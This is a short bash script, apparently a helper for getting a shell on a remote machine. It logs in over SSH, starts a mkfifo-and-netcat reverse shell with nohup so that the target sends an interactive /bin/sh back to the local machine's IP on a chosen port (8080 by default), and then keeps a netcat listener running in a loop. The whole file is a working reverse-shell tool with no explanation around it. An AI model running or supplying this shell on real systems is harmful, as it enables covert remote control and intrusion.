#!/bin/bash

PORT="$2"
: ${PORT:="8080"}

ssh "$1" -f "rm /tmp/f ; mkfifo /tmp/f ; nohup cat /tmp/f|/bin/sh -i 2>&1 | nc -n $(hostname -I | awk '{ print $1 }') $PORT > /tmp/f & "

while : ; do
  nc -nlvp $PORT
  sleep 1
done
